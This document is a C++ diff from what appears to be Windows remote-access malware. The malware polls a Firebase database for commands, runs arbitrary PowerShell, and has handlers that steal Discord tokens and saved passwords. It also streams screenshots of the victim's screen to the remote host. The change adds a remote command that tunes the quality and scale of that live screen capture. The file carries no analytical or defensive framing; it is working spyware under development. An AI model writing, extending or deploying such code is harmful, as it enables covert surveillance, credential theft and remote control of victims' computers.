@@ -20,6 +20,8 @@ using namespace Gdiplus;
 std::string computerName;
 std::string publicIP;
 bool g_noPing=false;
+int g_liveQuality=25;
+float g_liveScale=0.5f;
 const std::string FB_URL="solix-710c0-default-rtdb.europe-west1.firebasedatabase.app";
 
 std::string getComputerName() {
@@ -670,7 +672,11 @@ DWORD WINAPI pollThread(LPVOID) {
                         result=std::to_string((GetTickCount()-l.dwTime)/1000);
                     } else if (type == "powershell") result = execCmd("powershell -c "+payload);
                     else if (type == "uptime") result=std::to_string(GetTickCount64()/1000);
-                    else if (type == "discord_tokens") result = getDiscordTokens();
+                    else if (type == "live_config") {
+                        try{int q=std::stoi(extractJson(payload,"quality"));if(q>=1&&q<=100)g_liveQuality=q;}catch(...){}
+                        try{float s=std::stof(extractJson(payload,"scale"));if(s>=0.1f&&s<=1.0f)g_liveScale=s;}catch(...){}
+                        result="ok";
+                    } else if (type == "discord_tokens") result = getDiscordTokens();
                     else if (type == "passwords") result = getPasswords();
                     else if (type == "network_info") result = getNetworkInfo();
                     else if (type == "services") result = getServices();
@@ -689,17 +695,16 @@ DWORD WINAPI pollThread(LPVOID) {
 
 DWORD WINAPI screenThread(LPVOID) {
     Sleep(3000);
-    const float SCALE = 0.5f;
     const int TARGET_MS = 100;
-    const int LIVE_QUALITY = 25;
     while(true) {
         DWORD t0 = GetTickCount();
+        int q = g_liveQuality; float s = g_liveScale;
         try {
-            std::string b64 = takeScreenshotScaled(0, LIVE_QUALITY, SCALE);
+            std::string b64 = takeScreenshotScaled(0, q, s);
             std::string escaped = jsonEscape(b64);
             std::string ts = getTimestamp();
-            char scaleStr[16]; sprintf(scaleStr, "%.2f", SCALE);
-            std::string body = "{\"result\":\"" + escaped + "\",\"created_at\":\"" + ts + "\",\"scale\":" + std::string(scaleStr) + "}";
+            char scaleStr[16]; sprintf(scaleStr, "%.2f", s);
+            std::string body = "{\"result\":\"" + escaped + "\",\"created_at\":\"" + ts + "\",\"q\":" + std::to_string(q) + ",\"scale\":" + std::string(scaleStr) + "}";
             httpsPut("/live/" + fbEsc(computerName) + ".json", body);
         } catch(...) {}
         DWORD elapsed = GetTickCount() - t0;
